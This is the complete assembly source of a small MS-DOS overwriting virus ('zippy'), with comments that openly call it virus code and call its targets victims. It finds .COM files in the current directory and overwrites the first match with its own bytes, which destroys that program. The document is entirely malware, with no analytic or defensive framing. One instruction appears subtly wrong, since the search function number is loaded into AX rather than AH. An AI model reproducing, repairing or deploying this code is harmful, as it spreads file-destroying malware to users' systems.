       .model tiny
       .code
        org   100h

zippy:
        mov   ax,4Eh               ;Search for a file
        xor   cx,cx                ; with NORMAL attributes
        lea   dx,comfile           ; and has a .COM extension.
        int   21h
        mov   ax,3D01h             ;Open file with write access
        mov   dx,9Eh               ; using ASCIIZ filename from DTA
        int   21h
        xchg  bx,ax
        mov   ah,40h               ;Write the virus code
        mov   dx,si                ; starting from the beginning
        mov   cx,virend-zippy      ; until all virus bytes are written
        int   21h
        ret                        ;Drop to DOS

comfile:
        db      '*.COM',0          ;Used for victim search

virend:                            ;Simple marker to calculate length of
                                   ; virus code
end     zippy
